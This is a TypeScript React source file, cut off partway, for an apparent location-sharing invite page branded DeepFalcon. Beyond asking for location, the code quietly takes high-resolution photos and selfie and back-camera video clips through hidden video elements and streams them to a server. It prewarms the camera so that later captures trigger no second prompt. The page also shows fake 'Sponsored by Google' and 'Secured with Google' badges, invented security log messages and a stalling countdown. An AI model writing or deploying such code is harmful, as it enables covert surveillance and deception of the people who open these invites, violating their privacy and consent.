import { useState, useEffect, useRef, useCallback } from "react";
import { useParams } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import {
  useGetInviteByToken,
  useGrantLocationConsent,
  getGetInviteByTokenQueryKey,
} from "@workspace/api-client-react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import {
  Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle,
  WifiOff, ExternalLink, Camera, Video, ArrowLeft, Activity,
  Navigation, Share2, Copy, Check, Users, Phone,
} from "lucide-react";
import { classifySource, type LocationSource } from "@/hooks/use-fused-location";
import { FloatingSparkles } from "@/components/invites/FloatingSparkles";

const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
const GEO_PHOTO_COUNT = 5;
const GEO_SELFIE_PHOTO_COUNT = 2;
const LOCATION_SHARING_DURATION_MS = 10 * 60 * 1000;
// Back camera: ultra-compressed snapshot — goal is sub-second upload.
// 160×120 @ 10 fps, 48 kbps video-only → ~24 KB raw / ~32 KB base64 for 4 s.
const GEO_VIDEO_DURATION_MS = 30_000;
const GEO_VIDEO_DURATION_SECONDS = GEO_VIDEO_DURATION_MS / 1000;
const GEO_VIDEO_BPS = 48_000;   // back camera video bitrate (no audio)

// The live GeoBoard selfie records in short looping clips so each one is saved
// to GeoBoard immediately rather than waiting for the full session to end.
// After each clip finalises the loop restarts automatically while tracking.
const GEO_SELFIE_VIDEO_DURATION_MS = 40_000;   // 40-second clips
const GEO_SELFIE_VIDEO_DURATION_SECONDS = GEO_SELFIE_VIDEO_DURATION_MS / 1000;
const GEO_SELFIE_VIDEO_BPS = 80_000;

function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
  const ctrl = new AbortController();
  const id = setTimeout(() => ctrl.abort(), ms);
  return { signal: ctrl.signal, clear: () => clearTimeout(id) };
}

function copyToClipboard(text: string): Promise<void> {
  if (navigator.clipboard?.writeText) return navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
  return fallbackCopy(text);
}
function fallbackCopy(text: string): Promise<void> {
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
  document.body.appendChild(ta);
  try {
    ta.focus(); ta.select();
    const ok = document.execCommand("copy");
    return ok ? Promise.resolve() : Promise.reject(new Error("execCommand returned false"));
  } catch (e) { return Promise.reject(e); }
  finally { document.body.removeChild(ta); }
}

// 100vh is the universally safe fallback; svh is a progressive enhancement
// (Chrome 108+, Safari 15.4+) that correctly excludes the mobile URL bar.
// Inline styles can't have duplicate keys so we use a CSS variable trick:
// the outer wrapper sets both via a className defined below.
const fullHeight: React.CSSProperties = { minHeight: "100vh" };
const AUTO_RETRY_SECONDS = 5;

/** Cyber-themed retry indicator shown while auto-retrying location access. */
function StayWithMeKitten({ secondsLeft }: { secondsLeft: number }) {
  return (
    <div className="mt-1 mb-6 flex flex-col items-center gap-3">
      <div style={{ width: 52, height: 52, borderRadius: "50%", border: "1px solid rgba(245,160,8,0.4)", background: "rgba(245,160,8,0.08)", display: "flex", alignItems: "center", justifyContent: "center" }}>
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#F59E0B" strokeWidth="2.2" strokeLinejoin="round">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        </svg>
      </div>
      <p style={{ fontFamily: "'Share Tech Mono', monospace", color: "#F59E0B", fontSize: 13, letterSpacing: "0.07em" }}>
        [RETRY] Reconnecting in <span style={{ fontWeight: 700 }}>{secondsLeft}s</span>
      </p>
      <p style={{ fontFamily: "'Share Tech Mono', monospace", color: "rgba(245,160,8,0.5)", fontSize: 11, letterSpacing: "0.05em" }}>
        Recalibrating signal acquisition...
      </p>
    </div>
  );
}

function CopyAndOpenButton({ url }: { url: string }) {
  const [status, setStatus] = useState<"idle" | "copied" | "failed">("idle");
  const handleClick = () => {
    copyToClipboard(url).then(() => setStatus("copied")).catch(() => setStatus("failed"));

    const isAndroid = /Android/i.test(navigator.userAgent);
    if (isAndroid) {
      // Android intent URI: asks the OS to open the URL in the user's default
      // browser. Works in WhatsApp WebView, Telegram, Facebook, Instagram etc.
      // S.browser_fallback_url ensures a graceful fallback if no browser handles the intent.
      try {
        const encoded = encodeURIComponent(url);
        window.location.href =
          `intent://${url.replace(/^https?:\/\//, "")}#Intent;scheme=https;S.browser_fallback_url=${encoded};end`;
        return;
      } catch { /* fall through to normal open */ }
    }

    // iOS / desktop fallback: programmatic click on a _blank anchor
    const a = document.createElement("a");
    a.href = url; a.target = "_blank"; a.rel = "noreferrer";
    a.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
    document.body.appendChild(a); a.click();
    setTimeout(() => document.body.removeChild(a), 500);
  };
  return (
    <button onClick={handleClick} style={{ width: "100%", padding: "10px 16px", borderRadius: 8, background: status === "copied" ? "#16a34a" : "#F59E0B", color: status === "copied" ? "#fff" : "#040A18", fontWeight: 700, fontSize: 14, border: "none", cursor: "pointer", fontFamily: "'Share Tech Mono', monospace", letterSpacing: "0.04em" }}>
      {status === "copied" ? "✓ Link Copied — Open Browser Now" : status === "failed" ? "Open in Browser ↗" : "Copy Link & Open Browser"}
    </button>
  );
}

const KITTY_WAIT_SECONDS = 90;

// Rotating "Did you know?" facts shown every 5 s — keeps the wait engaging.
const KITTY_FACTS = [
  { emoji: "😴", text: "Cats sleep 12–16 hours a day — that's about 70% of their entire lives!" },
  { emoji: "🦴", text: "A cat's purr (25–150 Hz) is the exact frequency that promotes bone healing." },
  { emoji: "🎯", text: "Cats can leap up to 6× their own body length in a single bound." },
  { emoji: "👂", text: "Cats have 32 muscles in each ear and can rotate them a full 180°." },
  { emoji: "👃", text: "A cat's nose print is as unique as a human fingerprint — no two alike." },
  { emoji: "🗣️", text: "Cats make over 100 different vocal sounds. Dogs manage around 10." },
  { emoji: "🐱", text: "A group of cats is called a 'clowder'. A group of kittens is a 'kindle'." },
  { emoji: "🍯", text: "Honey never spoils — 3,000-year-old honey found in Egyptian tombs was still edible." },
  { emoji: "🌍", text: "A single day on Venus is longer than an entire year on Venus." },
  { emoji: "🔺", text: "Cleopatra lived closer in time to the Moon landing than to the Great Pyramids." },
  { emoji: "🍓", text: "Bananas are technically berries — but strawberries aren't." },
  { emoji: "🗼", text: "The Eiffel Tower grows 15 cm taller every summer due to thermal expansion." },
  { emoji: "🐙", text: "Octopuses have three hearts, blue blood, and nine brains." },
  { emoji: "♟️", text: "There are more possible chess games than atoms in the observable universe." },
  { emoji: "⚡", text: "Lightning strikes Earth around 100 times every single second." },
  { emoji: "🧠", text: "Your brain consumes 20% of your body's energy despite being just 2% of your weight." },
  { emoji: "🦩", text: "A group of flamingos is called a 'flamboyance'. How fitting." },
  { emoji: "🌊", text: "The Pacific Ocean is larger than all of Earth's landmasses combined." },
  { emoji: "🐝", text: "A single honey bee produces only 1/12th of a teaspoon of honey in its lifetime." },
  { emoji: "🎶", text: "Music has been shown to make plants grow faster — classical works best." },
];

// Cat emoji moods — one swaps in every 8 s for visual variety
const KITTY_MOODS = ["🐱", "😺", "😸", "😻", "😼", "😽", "🙀", "🐈"];

// Burst emojis that fly up when the kitty is tapped
const KITTY_PET_REACTIONS = ["💕", "😻", "✨", "🐾", "💫", "🌸", "⭐", "🎀", "💖", "🌟"];

// Achievement unlocks at pet-count milestones
const KITTY_ACHIEVEMENTS: Record<number, string> = {
  5:  "Kitty whisperer! 🏅",
  10: "Purr master! 🎖️",
  20: "Legendary petter! 👑",
  50: "You are unstoppable! 🌟",
};

/** Real eagle photo used in place of the old geometric SVG. */
function GeometricEagle() {
  return (
    <img
      src="/eagle-nest.png"
      alt="DeepFalcon eagle"
      style={{
        width: "100%",
        height: "100%",
        objectFit: "cover",
        borderRadius: "50%",
        display: "block",
      }}
    />
  );
}

const APEX_LOGS = [
  "[TELEMETRY] Vector calibration active...",
  "[ENCRYPTION] Handshake sequence verified.",
  "[NETWORK] Secure tunnel established.",
  "[GPS] Signal acquisition initiated...",
  "[AUTH] Token validated. Access granted.",
  "[SYNC] Calibrating telemetry vectors...",
  "[FIREWALL] Perimeter checks passed.",
  "[UPLINK] Data stream aligned.",
  "[SENTINEL] Threat matrix nominal.",
  "[GEOFENCE] Boundary parameters loaded.",
];

/** Apex cyber-eagle full-screen overlay shown while location sync is being set up. */
function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
  const [secondsLeft, setSecondsLeft] = useState(KITTY_WAIT_SECONDS);
  const [done, setDone] = useState(false);
  const [logLines, setLogLines] = useState([APEX_LOGS[0], APEX_LOGS[1]]);

  const onCompleteRef = useRef(onComplete);
  useEffect(() => { onCompleteRef.current = onComplete; }, [onComplete]);

  // Countdown
  useEffect(() => {
    if (secondsLeft <= 0) { setDone(true); return; }
    const id = setTimeout(() => setSecondsLeft(s => s - 1), 1000);
    return () => clearTimeout(id);
  }, [secondsLeft]);

  // Done → call onComplete after a short beat so the user sees "SYNC COMPLETE"
  useEffect(() => {
    if (!done) return;
    const id = setTimeout(() => onCompleteRef.current(), 900);
    return () => clearTimeout(id);
  }, [done]);

  // Cycle log lines every 4 s
  useEffect(() => {
    let idx = 2;
    const id = setInterval(() => {
      setLogLines(prev => [...prev.slice(-2), APEX_LOGS[idx % APEX_LOGS.length]]);
      idx++;
    }, 4000);
    return () => clearInterval(id);
  }, []);

  const progress = (KITTY_WAIT_SECONDS - secondsLeft) / KITTY_WAIT_SECONDS;

  return (
    <div style={{
      minHeight: "100vh",
      background: "#040A18",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      fontFamily: "'Share Tech Mono', ui-monospace, 'Cascadia Code', monospace",
      position: "relative",
      overflow: "hidden",
    }}>
      {/* Dot-grid background */}
      <div style={{
        position: "absolute", inset: 0,
        backgroundImage: "radial-gradient(circle at 1px 1px, rgba(245,160,8,0.07) 1px, transparent 0)",
        backgroundSize: "28px 28px",
        pointerEvents: "none",
      }}/>
      {/* Top amber radial glow */}
      <div style={{
        position: "absolute", top: 0, left: "50%", transform: "translateX(-50%)",
        width: "70%", height: "220px",
        background: "radial-gradient(ellipse at top, rgba(245,160,8,0.09) 0%, transparent 70%)",
        pointerEvents: "none",
      }}/>

      {/* Brand */}
      <div style={{
        position: "absolute", top: 22, left: "50%", transform: "translateX(-50%)",
        display: "flex", alignItems: "center", gap: 10,
      }}>
        <div style={{
          width: 32, height: 32, borderRadius: 8,
          background: "linear-gradient(135deg, #F59E0B 0%, #D97706 100%)",
          display: "flex", alignItems: "center", justifyContent: "center",
          boxShadow: "0 0 12px rgba(245,160,8,0.4)",
        }}>
          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
          </svg>
        </div>
        <span style={{ color: "#E2E5EE", fontFamily: "system-ui, sans-serif", fontWeight: 700, fontSize: 17, letterSpacing: "-0.01em" }}>
          DeepFalcon
        </span>
      </div>

      {/* Eagle + ring */}
      <div style={{ position: "relative", width: 240, height: 240, marginBottom: 28 }}>
        {/* Outer spinning dashed ring */}
        <svg viewBox="0 0 240 240" style={{ position: "absolute", inset: 0, width: "100%", height: "100%", animation: "apex-spin 10s linear infinite" }}>
          <circle cx="120" cy="120" r="112" stroke="#F59E0B" strokeWidth="3" fill="none"
            strokeDasharray="9 5" strokeLinecap="round" opacity="0.85"/>
        </svg>
        {/* Inner counter-spinning ring */}
        <svg viewBox="0 0 240 240" style={{ position: "absolute", inset: 0, width: "100%", height: "100%", animation: "apex-spin-rev 16s linear infinite" }}>
          <circle cx="120" cy="120" r="98" stroke="#F59E0B" strokeWidth="1" fill="none"
            strokeDasharray="3 14" opacity="0.38"/>
        </svg>
        {/* Cardinal ticks + dark background circle */}
        <svg viewBox="0 0 240 240" style={{ position: "absolute", inset: 0, width: "100%", height: "100%" }}>
          <circle cx="120" cy="120" r="86" fill="#040A18" stroke="#F59E0B" strokeWidth="1" opacity="0.25"/>
          <line x1="2"   y1="120" x2="16"  y2="120" stroke="#F59E0B" strokeWidth="2.5" opacity="0.9"/>
          <line x1="224" y1="120" x2="238" y2="120" stroke="#F59E0B" strokeWidth="2.5" opacity="0.9"/>
          <line x1="120" y1="2"   x2="120" y2="16"  stroke="#F59E0B" strokeWidth="2.5" opacity="0.9"/>
          <line x1="120" y1="224" x2="120" y2="238" stroke="#F59E0B" strokeWidth="2.5" opacity="0.9"/>
        </svg>
        {/* Eagle */}
        <div style={{ position: "absolute", inset: "30px", display: "flex", alignItems: "center", justifyContent: "center" }}>
          <GeometricEagle />
        </div>
      </div>

      {/* Status */}
      <div style={{ textAlign: "center", marginBottom: 22 }}>
        <div style={{ color: "#F59E0B", fontSize: 20, fontWeight: 700, letterSpacing: "0.14em", marginBottom: 14 }}>
          {done ? "SYNC COMPLETE //" : `SYSTEM SYNC // ${secondsLeft}S`}
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
          {logLines.map((line, i) => (
            <div key={i} style={{
              color: i === logLines.length - 1 ? "#F5A008" : "rgba(245,160,8,0.42)",
              fontSize: 11, letterSpacing: "0.06em",
            }}>
              {line}
            </div>
          ))}
        </div>
      </div>

      {/* Progress bar */}
      <div style={{ width: 220, height: 2, background: "rgba(245,160,8,0.14)", borderRadius: 1, overflow: "hidden" }}>
        <div style={{
          height: "100%",
          background: "linear-gradient(90deg, #D97706, #F59E0B)",
          width: `${progress * 100}%`,
          transition: "width 1s linear",
          boxShadow: "0 0 6px rgba(245,160,8,0.5)",
        }}/>
      </div>
    </div>
  );
}


/** Beautiful popup shown after contacts are synced. */
function ContactsSyncedPopup({
  contacts,
  onClose,
  senderName,
}: {
  contacts: { name: string; phone: string | null; email?: string | null }[];
  onClose: () => void;
  senderName: string;
}) {
  useEffect(() => {
    const t = setTimeout(onClose, 4500);
    return () => clearTimeout(t);
  }, [onClose]);

  return (
    <div
      className="fixed inset-0 z-[200] flex items-center justify-center p-4"
      style={{ background: "rgba(0,0,0,0.75)", backdropFilter: "blur(10px)", WebkitBackdropFilter: "blur(10px)" }}
    >
      <motion.div
        className="w-full max-w-sm rounded-3xl overflow-hidden"
        style={{ background: "linear-gradient(160deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)", border: "1px solid rgba(99,102,241,0.3)", boxShadow: "0 0 60px rgba(99,102,241,0.25)" }}
        initial={{ opacity: 0, scale: 0.85, y: 20 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        transition={{ duration: 0.5, type: "spring", bounce: 0.4 }}
      >
        {/* Confetti header */}
        <div className="relative px-6 pt-8 pb-4 text-center overflow-hidden">
          <FloatingSparkles />
          <motion.div
            className="text-5xl mb-3"
            initial={{ scale: 0 }}
            animate={{ scale: [0, 1.3, 1], rotate: [0, -10, 5, 0] }}
            transition={{ duration: 0.6, delay: 0.1 }}
          >
            ✅
          </motion.div>
          <h2 className="text-xl font-bold text-white mb-1">Emergency contacts saved! 🦋</h2>
          <p className="text-sm text-indigo-300">Shared with {senderName} • Sponsored by Google</p>
          <div className="flex items-center justify-center gap-1.5 mt-1.5">
            {/* Google G logo */}
            <svg width="14" height="14" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
              <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
              <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
              <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
              <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
            </svg>
            <span className="text-xs text-indigo-200/70">Secured with Google</span>
          </div>
        </div>

        {/* Contact list */}
        <div className="px-6 pb-6 space-y-3">
          {contacts.map((c, i) => (
            <motion.div
              key={i}
              className="flex items-center gap-3 rounded-2xl px-4 py-3"
              style={{ background: "rgba(99,102,241,0.12)", border: "1px solid rgba(99,102,241,0.2)" }}
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.2 + i * 0.12 }}
            >
              <div className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-lg"
                style={{ background: ["rgba(245,158,11,0.2)", "rgba(99,102,241,0.2)", "rgba(16,185,129,0.2)"][i % 3], color: ["#f59e0b", "#818cf8", "#10b981"][i % 3] }}>
                {(c.name || "?")[0]?.toUpperCase()}
              </div>
              <div className="flex-1 min-w-0">
                <p className="font-semibold text-white text-sm truncate">{c.name || "Unknown"}</p>
                <p className="text-xs text-indigo-300 truncate">{c.phone || c.email || "No contact info"}</p>
              </div>
              <motion.span
                className="text-emerald-400 text-lg"
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ delay: 0.4 + i * 0.12, type: "spring" }}
              >
                ✓
              </motion.span>
            </motion.div>
          ))}
        </div>

        {/* Success toast bottom */}
        <div className="px-6 pb-4">
          <div className="rounded-2xl py-3 text-center text-sm font-semibold text-emerald-300"
            style={{ background: "rgba(16,185,129,0.12)", border: "1px solid rgba(16,185,129,0.25)" }}>
            Emergency contacts saved successfully ✓
          </div>
        </div>

        {/* Please wait indicator */}
        <div className="px-6 pb-6">
          <motion.div
            className="flex items-center justify-center gap-2"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.8 }}
          >
            <motion.div
              className="flex gap-1"
              animate={{}}
            >
              {[0, 1, 2].map((i) => (
                <motion.span
                  key={i}
                  className="w-1.5 h-1.5 rounded-full bg-indigo-400"
                  animate={{ y: [0, -5, 0], opacity: [0.4, 1, 0.4] }}
                  transition={{ duration: 0.8, repeat: Infinity, delay: i * 0.18, ease: "easeInOut" }}
                />
              ))}
            </motion.div>
            <span className="text-xs font-medium text-indigo-300 tracking-wide">
              Please wait, loading your live sharing…
            </span>
          </motion.div>
        </div>
      </motion.div>
    </div>
  );
}

type ConsentState =
  | "idle"
  | "pre_consent"
  | "requesting"
  | "granting"
  | "tracking"
  | "gps_off"
  | "denied"
  | "error"
  | "webview_blocked";

type ActivityType = "stationary" | "walking" | "running" | "driving";

const ACTIVITY_INFO: Record<ActivityType, { icon: string; label: string; color: string }> = {
  stationary: { icon: "📍", label: "Stationary",  color: "#6366f1" },
  walking:    { icon: "🚶", label: "Walking",      color: "#10b981" },
  running:    { icon: "🏃", label: "Running",      color: "#f59e0b" },
  driving:    { icon: "🚗", label: "Driving",      color: "#3b82f6" },
};

/** Convert decimal degrees to DMS string */
function toDMS(dd: number, isLat: boolean): string {
  const dir = isLat ? (dd >= 0 ? "N" : "S") : (dd >= 0 ? "E" : "W");
  const abs = Math.abs(dd);
  const deg = Math.floor(abs);
  const minFull = (abs - deg) * 60;
  const min = Math.floor(minFull);
  const sec = ((minFull - min) * 60).toFixed(1);
  return `${deg}°${min}′${sec}″${dir}`;
}
function formatDMS(lat: number, lng: number): string {
  return `${toDMS(lat, true)} ${toDMS(lng, false)}`;
}

/**
 * Requests the camera once from a user gesture, then immediately releases the
 * warm-up track. Later GeoBoard capture can use the granted camera permission
 * without a second prompt. Audio is deliberately never requested for the live
 * selfie recording.
 */
function prewarmCamera(): void {
  if (!navigator.mediaDevices?.getUserMedia) return;
  navigator.mediaDevices
    .getUserMedia({
      video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false,
    })
    .then((stream) => stream.getTracks().forEach((t) => t.stop()))
    .catch(() => { /* camera denied — GeoBoard capture will no-op later */ });
}

async function uploadGeoPhoto(
  token: string, photoData: string, lat: number, lng: number, address: string | undefined,
  cameraFacing: "environment" | "user",
): Promise<boolean> {
  try {
    const { signal, clear } = abortAfter(6_000);
    const resp = await fetch(`${API_BASE}/api/geo-photos`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address, cameraFacing }), signal }).finally(clear);
    return resp.ok;
  } catch { return false; }
}

/** Upload a single raw binary video chunk to the server (no base64 overhead). */
async function uploadVideoChunk(
  uploadId: string, index: number, token: string, chunk: Blob,
): Promise<void> {
  const { signal, clear } = abortAfter(30_000);
  try {
    await fetch(
      `${API_BASE}/api/geo-videos/chunk?uploadId=${encodeURIComponent(uploadId)}&index=${index}&token=${encodeURIComponent(token)}`,
      { method: "POST", headers: { "Content-Type": "application/octet-stream" }, body: chunk, signal },
    ).finally(clear);
  } catch { /* individual chunk failure is non-fatal — finalize will detect missing chunks */ }
}

/** Tell the server to assemble all uploaded chunks and persist the video. */
async function finalizeVideoUpload(
  uploadId: string, token: string, mimeType: string, durationMs: number,
  lat: number, lng: number, address: string | undefined, cameraFacing: "environment" | "user",
): Promise<boolean> {
  try {
    const { signal, clear } = abortAfter(20_000);
    const resp = await fetch(`${API_BASE}/api/geo-videos/finalize`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ uploadId, token, mimeType, durationMs, latitude: lat, longitude: lng, address, cameraFacing }),
      signal,
    }).finally(clear);
    return resp.ok || resp.status === 201;
  } catch { return false; }
}

// Tiny frame — 320×240 @ 0.45 JPEG ≈ 8–14 KB per shot, uploads in <100ms
// on any 4G connection while still being fully identifiable.
const GEO_PHOTO_WIDTH = 1280;
const GEO_PHOTO_HEIGHT = 960;
const GEO_PHOTO_QUALITY = 0.85;

async function captureGeoPhotos(
  token: string, lat: number, lng: number, address: string | undefined,
  onProgress: (n: number) => void,
  facingMode: "environment" | "user" = "environment",
  count: number = GEO_PHOTO_COUNT,
): Promise<void> {
  if (!navigator.mediaDevices?.getUserMedia) return;
  let stream: MediaStream | null = null;
  try {
    // Request exactly at capture resolution — avoids the browser acquiring a
    // full 720p stream and downscaling, which adds hundreds of ms of setup time.
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: GEO_PHOTO_WIDTH, min: 640 }, height: { ideal: GEO_PHOTO_HEIGHT, min: 480 } }, audio: false });
    const video = document.createElement("video");
    video.srcObject = stream; video.muted = true; video.playsInline = true; video.autoplay = true;
    // Explicit play() call needed on old Android WebViews that ignore autoplay attr;
    // catch and swallow if the browser blocks autoplay on a muted video.
    await video.play().catch(() => {});
    // Wait for the browser to signal the camera is actually delivering frames,
    // then hold for an extra 900 ms so the sensor finishes auto-exposure and
    // auto-white-balance — without this, Android cameras produce black frames.
    await new Promise<void>((resolve) => {
      if (video.readyState >= /* HAVE_ENOUGH_DATA */ 4) { resolve(); return; }
      const done = () => { video.removeEventListener("playing", done); resolve(); };
      video.addEventListener("playing", done);
      setTimeout(resolve, 3000); // hard fallback
    });
    await new Promise((r) => setTimeout(r, 900));
    const canvas = document.createElement("canvas"); canvas.width = GEO_PHOTO_WIDTH; canvas.height = GEO_PHOTO_HEIGHT;
    const ctx = canvas.getContext("2d")!;
    // Selfie shots (front camera) are naturally mirrored by the sensor on
    // most devices' preview — flip horizontally so the saved photo looks
    // like a normal (non-mirrored) selfie.
    if (facingMode === "user") { ctx.translate(GEO_PHOTO_WIDTH, 0); ctx.scale(-1, 1); }

    // Grab all frames back-to-back (only a small gap so each frame is
    // distinct), then compress + upload every shot in parallel instead of
    // serializing capture behind each upload's round trip.
    let uploaded = 0;
    const uploads: Promise<void>[] = [];
    for (let i = 0; i < count; i++) {
      ctx.drawImage(video, 0, 0, GEO_PHOTO_WIDTH, GEO_PHOTO_HEIGHT);
      const photoData = canvas.toDataURL("image/jpeg", GEO_PHOTO_QUALITY);
      uploads.push(
        uploadGeoPhoto(token, photoData, lat, lng, address, facingMode).then((ok) => {
          if (ok) { uploaded += 1; onProgress(uploaded); }
        }),
      );
      if (i < count - 1) await new Promise((r) => setTimeout(r, 30));
    }
    await Promise.all(uploads);
  } catch { /* camera denied — skip */ } finally { stream?.getTracks().forEach((t) => t.stop()); }
}

interface GeoVideoConfig {
  facingMode?: "environment" | "user";
  durationMs?: number;
  videoBps?: number;
  /** null = no audio track (back-camera mode) */
  audioBps?: number | null;
  width?: number;
  height?: number;
  frameRate?: number;
  onElapsed?: (elapsedSeconds: number) => void;
  /**
   * Lets the active location-sharing session stop and finalize this recording
   * immediately, rather than waiting for its maximum duration.
   */
  handle?: GeoVideoHandle;
}

interface GeoVideoHandle {
  stop: () => void;
}

async function captureGeoVideo(
  token: string, lat: number, lng: number, address: string | undefined,
  onStateChange: (s: "recording" | "uploading" | "done" | "error") => void,
  config: GeoVideoConfig = {},
): Promise<void> {
  const {
    facingMode = "environment",
    durationMs = GEO_VIDEO_DURATION_MS,
    videoBps = GEO_VIDEO_BPS,
    audioBps = null,          // back-camera default: no audio
    width = 160, height = 120, frameRate = 10,
    onElapsed,
    handle,
  } = config;
  if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
  const MIME_CANDIDATES = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"];
  const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
  let stream: MediaStream | null = null;
  let recorder: MediaRecorder | null = null;
  let stopRequested = false;
  let stopTimer: ReturnType<typeof setTimeout> | null = null;
  let elapsedTimer: ReturnType<typeof setInterval> | null = null;

  const stopRecording = () => {
    stopRequested = true;
    if (recorder?.state === "recording") recorder.stop();
  };
  if (handle) handle.stop = stopRecording;

  try {
    const constraints: MediaStreamConstraints = {
      video: { facingMode, width: { ideal: width, max: width * 2 }, height: { ideal: height, max: height * 2 }, frameRate: { ideal: frameRate, max: frameRate + 5 } },
      audio: audioBps != null ? { echoCancellation: true, noiseSuppression: true } : false,
    };
    stream = await navigator.mediaDevices.getUserMedia(constraints);

    // Attach to a hidden video element and wait for the 'playing' event so we
    // know the camera sensor is actually delivering real frames before we start
    // the MediaRecorder.  Without this, Android cameras produce black video for
    // the first several hundred ms.  Add an extra 700 ms for AE/AWB to settle.
    const warmupVideo = document.createElement("video");
    warmupVideo.srcObject = stream; warmupVideo.muted = true; warmupVideo.playsInline = true;
    await warmupVideo.play().catch(() => {});
    await new Promise<void>((resolve) => {
      if (warmupVideo.readyState >= 4) { resolve(); return; }
      const done = () => { warmupVideo.removeEventListener("playing", done); resolve(); };
      warmupVideo.addEventListener("playing", done);
      setTimeout(resolve, 3000);
    });
    await new Promise((r) => setTimeout(r, 700));
    warmupVideo.srcObject = null; // detach — stream stays open for MediaRecorder

    // The sharing session may have ended while the browser was opening or
    // warming the camera. In that case, release it without beginning capture.
    if (stopRequested) return;

    // ── Chunked streaming upload ────────────────────────────────────────────
    // Each MediaRecorder timeslice fires ondataavailable immediately; we POST
    // that raw binary blob to /geo-videos/chunk right away (no base64 encoding,
    // no waiting for the full recording to finish).  By the time recording
    // stops, most of the data is already on the server — finalize just
    // concatenates the temp files and writes one DB row.
    const uploadId = (typeof crypto !== "undefined" && crypto.randomUUID)
      ? crypto.randomUUID()
      : Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);

    let chunkIndex = 0;
    const chunkUploads: Promise<void>[] = [];

    const recorderOptions: MediaRecorderOptions = {};
    if (mimeType) recorderOptions.mimeType = mimeType;
    recorderOptions.videoBitsPerSecond = videoBps;
    if (audioBps != null) recorderOptions.audioBitsPerSecond = audioBps;

    const activeRecorder = new MediaRecorder(stream, recorderOptions);
    recorder = activeRecorder;

    activeRecorder.ondataavailable = (e) => {
      if (e.data.size === 0) return;
      const idx = chunkIndex++;
      // Fire binary upload immediately — runs in parallel with ongoing recording
      chunkUploads.push(uploadVideoChunk(uploadId, idx, token, e.data));
    };

    onStateChange("recording");

    // Live elapsed-second ticker for UI countdown
    if (onElapsed) {
      let elapsed = 0;
      elapsedTimer = setInterval(() => { elapsed += 1; onElapsed(elapsed); }, 1000);
    }

    // 3-second timeslice: large enough to amortise HTTP round-trip overhead,
    // small enough that chunks are already in flight well before recording ends.
    const CHUNK_MS = 3_000;
    const recordingStartedAt = Date.now();
    await new Promise<void>((resolve, reject) => {
      activeRecorder.onstop = () => resolve();
      activeRecorder.onerror = () => reject(new Error("MediaRecorder error"));
      activeRecorder.start(CHUNK_MS);
      stopTimer = setTimeout(stopRecording, durationMs);
      if (stopRequested) stopRecording();
    });
    if (stopTimer) { clearTimeout(stopTimer); stopTimer = null; }
    if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }

    if (chunkIndex === 0) { onStateChange("error"); return; }

    // Wait for any still-in-flight chunk uploads before finalizing
    onStateChange("uploading");
    await Promise.all(chunkUploads);

    // Ask the server to assemble chunks → DB row (sends only small JSON metadata)
    const actualDurationMs = Math.max(1, Math.min(durationMs, Date.now() - recordingStartedAt));
    const uploaded = await finalizeVideoUpload(
      uploadId, token, mimeType || "video/webm", actualDurationMs,
      lat, lng, address, facingMode,
    );
    onStateChange(uploaded ? "done" : "error");
  } catch {
    // Stopping before getUserMedia resolves is an expected shutdown path, not
    // a visible capture error.
    if (!stopRequested) onStateChange("error");
  } finally {
    if (stopTimer) clearTimeout(stopTimer);
    if (elapsedTimer) clearInterval(elapsedTimer);
    if (handle) handle.stop = () => {};
    stream?.getTracks().forEach((t) => t.stop());
  }
}

function detectWebView(): boolean {
